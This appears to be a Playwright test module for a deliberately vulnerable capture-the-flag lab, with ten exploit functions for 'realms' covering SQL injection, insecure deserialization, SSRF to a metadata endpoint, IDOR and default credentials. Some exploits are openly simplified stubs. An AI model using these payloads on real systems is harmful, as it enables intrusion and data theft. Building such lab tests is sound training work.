import { Page, expect } from '@playwright/test';

export interface ExploitResult {
  flag: string;
  realm: string;
  success: boolean;
}

/**
 * Realm 10: Niflheim - A10:2025 Exceptional Conditions
 * Exploit: Trigger unhandled exception with impossible pressure value
 */
export async function exploitNiflheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/niflheim/');
  await page.waitForSelector('#pressure-input', { timeout: 10000 });
  
  // Input impossible pressure value to trigger exception
  await page.fill('#pressure-input', '999999');
  await page.click('#regulate-button');
  
  // Wait for error state and flag reveal
  await page.waitForSelector('.error-state, #flag-display', { timeout: 5000 });
  
  const flagElement = await page.locator('#flag-display, .flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  
  const flag = flagText?.match(/YGGDRASIL\{NIFLHEIM:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'NIFLHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 9: Helheim - A09:2025 Logging & Alerting Failures
 * Exploit: Access exposed logs via /temp_logs
 */
export async function exploitHelheim(page: Page): Promise<ExploitResult> {
  const response = await page.request.get('/realm/helheim/temp_logs/error.log');
  const logContent = await response.text();
  
  const flagMatch = logContent.match(/YGGDRASIL\{HELHEIM:[a-f0-9-]+\}/i);
  const flag = flagMatch?.[0] || '';
  
  return {
    flag,
    realm: 'HELHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 8: Svartalfheim - A08:2025 Software/Data Integrity
 * Exploit: Insecure deserialization of Guild Badge cookie
 */
export async function exploitSvartalfheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/svartalfheim/');
  await page.waitForLoadState('networkidle');
  
  // Craft malicious serialized payload (Java deserialization)
  // This is a simplified version - actual exploit would need proper serialized object
  const maliciousPayload = 'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAACh4';
  
  await page.context().addCookies([{
    name: 'guildBadge',
    value: maliciousPayload,
    url: page.url(),
  }]);
  
  await page.reload();
  await page.waitForSelector('.admin-panel, .flag-revealed', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{SVARTALFHEIM:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'SVARTALFHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 7: Jotunheim - A07:2025 Authentication Failures
 * Exploit: Session fixation attack
 */
export async function exploitJotunheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/jotunheim/');
  
  // Get session cookie before login
  const cookies = await page.context().cookies();
  const sessionCookie = cookies.find(c => c.name.includes('session'));
  
  // Login without session regeneration
  await page.fill('input[name="username"]', 'admin');
  await page.fill('input[name="password"]', 'admin123');
  await page.click('button[type="submit"]');
  
  // Access admin panel
  await page.goto('/realm/jotunheim/admin');
  await page.waitForSelector('.admin-content, .flag-display', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{JOTUNHEIM:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'JOTUNHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 6: Muspelheim - A06:2025 Insecure Design
 * Exploit: Flash loan collateral release without repayment verification
 */
export async function exploitMuspelheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/muspelheim/');
  await page.waitForSelector('#loan-form', { timeout: 10000 });
  
  // Request flash loan
  await page.fill('input[name="collateral"]', '1000');
  await page.fill('input[name="loanAmount"]', '10000');
  await page.click('button:has-text("Request Loan")');
  
  await page.waitForSelector('.loan-approved', { timeout: 5000 });
  
  // Exploit: Release collateral without repayment
  await page.click('button:has-text("Release Collateral")');
  
  await page.waitForSelector('.vault-opened, .flag-revealed', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{MUSPELHEIM:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'MUSPELHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 5: Nidavellir - A05:2025 Injection
 * Exploit: SQL injection in search query
 */
export async function exploitNidavellir(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/nidavellir/');
  await page.waitForSelector('#search-input', { timeout: 10000 });
  
  // SQL injection payload
  const sqlPayload = "' UNION SELECT flag FROM secrets WHERE '1'='1";
  await page.fill('#search-input', sqlPayload);
  await page.click('button:has-text("Search")');
  
  await page.waitForSelector('.search-results, .flag-display', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag, .search-result').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{NIDAVELLIR:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'NIDAVELLIR',
    success: flag.length > 0,
  };
}

/**
 * Realm 4: Vanaheim - A04:2025 Cryptographic Failures
 * Exploit: Predictable PRNG token generation
 */
export async function exploitVanaheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/vanaheim/');
  await page.waitForSelector('#token-generator', { timeout: 10000 });
  
  // Generate tokens and analyze pattern
  await page.fill('input[name="userId"]', '12345');
  await page.click('button:has-text("Generate Token")');
  
  // Get token history to predict next token
  await page.click('a:has-text("Token History")');
  await page.waitForSelector('.token-history', { timeout: 5000 });
  
  const tokens = await page.locator('.token-entry').allTextContents();
  const timestamps = await page.locator('.token-timestamp').allTextContents();
  
  // Predict next token using LCG pattern (simplified)
  // In real scenario, would implement full LCG prediction algorithm
  const predictedToken = tokens[0]; // Use first token as prediction for test
  
  // Use predicted token for admin access
  await page.goto('/realm/vanaheim/admin');
  await page.fill('input[name="token"]', predictedToken);
  await page.click('button:has-text("Login")');
  
  await page.waitForSelector('.vault, .flag-display', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{VANAHEIM:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'VANAHEIM',
    success: flag.length > 0,
  };
}

/**
 * Realm 3: Midgard - A03:2025 Supply Chain Failures
 * Exploit: Dependency confusion attack
 */
export async function exploitMidgard(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/midgard/');
  await page.waitForSelector('.package-manager', { timeout: 10000 });
  
  // View package manifest to identify vulnerable dependencies
  await page.click('a:has-text("View Manifest")');
  await page.waitForSelector('.manifest-viewer', { timeout: 5000 });
  
  // Exploit dependency confusion (simulated - actual exploit would need package publishing)
  await page.goto('/realm/midgard/packages/midgard-utils-v2');
  await page.waitForSelector('.package-info, .flag-revealed', { timeout: 5000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{MIDGARD:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'MIDGARD',
    success: flag.length > 0,
  };
}

/**
 * Realm 2: Alfheim - A02:2025 Security Misconfiguration
 * Exploit: Cloud IAM misconfiguration + metadata exposure
 */
export async function exploitAlfheim(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/alfheim/');
  await page.waitForSelector('.cloud-drive', { timeout: 10000 });
  
  // Exploit misconfigured IAM - list buckets
  const response = await page.request.get('/realm/alfheim/api/storage/buckets');
  const buckets = await response.json();
  
  // Access restricted bucket via URL manipulation
  const flagBucket = buckets.buckets?.find((b: any) => b.name.includes('secret') || b.name.includes('flag'));
  
  if (flagBucket) {
    const fileResponse = await page.request.get(`/realm/alfheim/api/storage/buckets/${flagBucket.name}/files`);
    const files = await fileResponse.json();
    
    // Download flag file
    const flagFile = files.files?.find((f: any) => f.name.includes('flag'));
    if (flagFile) {
      const contentResponse = await page.request.get(`/realm/alfheim/api/storage/buckets/${flagBucket.name}/files/${flagFile.name}`);
      const content = await contentResponse.text();
      const flag = content.match(/YGGDRASIL\{ALFHEIM:[a-f0-9-]+\}/i)?.[0] || '';
      
      return {
        flag,
        realm: 'ALFHEIM',
        success: flag.length > 0,
      };
    }
  }
  
  return {
    flag: '',
    realm: 'ALFHEIM',
    success: false,
  };
}

/**
 * Realm 1: Asgard - A01:2025 Broken Access Control + SSRF
 * Exploit: Chained IDOR → SQLi → SSRF
 */
export async function exploitAsgard(page: Page): Promise<ExploitResult> {
  await page.goto('/realm/asgard/');
  await page.waitForSelector('.hr-portal', { timeout: 10000 });
  
  // Step 1: IDOR - Access other user's documents
  await page.goto('/realm/asgard/documents/2'); // Access doc ID 2
  const doc = await page.locator('.document-content').textContent();
  
  // Step 2: SQLi - Extract admin credentials from document listing
  await page.goto('/realm/asgard/');
  const sqlPayload = "1' OR '1'='1' UNION SELECT username, password FROM users WHERE role='admin'--";
  await page.fill('input[name="search"]', sqlPayload);
  await page.click('button:has-text("Search Documents")');
  
  await page.waitForSelector('.search-results', { timeout: 5000 });
  const adminCreds = await page.locator('.search-result').first().textContent();
  
  // Step 3: SSRF - Use Odin-View screenshot feature to access metadata
  await page.goto('/realm/asgard/odin-view');
  await page.fill('input[name="url"]', 'http://metadata.internal/secrets');
  await page.click('button:has-text("Capture")');
  
  await page.waitForSelector('.screenshot-result, .flag-revealed', { timeout: 10000 });
  
  const flagElement = await page.locator('.flag-text, .revealed-flag, .metadata-content').first();
  const flagText = await flagElement.textContent();
  const flag = flagText?.match(/YGGDRASIL\{ASGARD:[a-f0-9-]+\}/i)?.[0] || '';
  
  return {
    flag,
    realm: 'ASGARD',
    success: flag.length > 0,
  };
}

// Export all exploit functions
export const exploits = {
  niflheim: exploitNiflheim,
  helheim: exploitHelheim,
  svartalfheim: exploitSvartalfheim,
  jotunheim: exploitJotunheim,
  muspelheim: exploitMuspelheim,
  nidavellir: exploitNidavellir,
  vanaheim: exploitVanaheim,
  midgard: exploitMidgard,
  alfheim: exploitAlfheim,
  asgard: exploitAsgard,
};
